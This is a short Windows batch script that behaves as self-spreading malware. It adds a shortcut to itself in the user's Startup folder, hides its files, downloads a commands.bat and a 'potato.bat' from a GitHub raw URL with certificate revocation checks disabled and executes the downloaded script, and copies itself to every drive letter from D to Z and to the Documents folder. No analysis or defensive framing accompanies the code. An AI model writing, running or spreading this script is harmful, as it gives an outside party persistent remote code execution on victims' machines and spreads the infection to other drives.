@echo off
echo %~nx0
:: Copy to startup
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
mkdir system2
attrib +h system2
cd system2
:: get commands
curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > commands.bat



call commands.bat
attrib +h %~nx0

if %~d0=="C:" (
:: get auto updates
curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/potato.bat > potato.bat
for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO @if exist %%i: xcopy /s /h /y %0 %%i:

)

if not %~dp0 =="C:\" (
copy %0 %UserProfile%\Documents

)
call commands.bat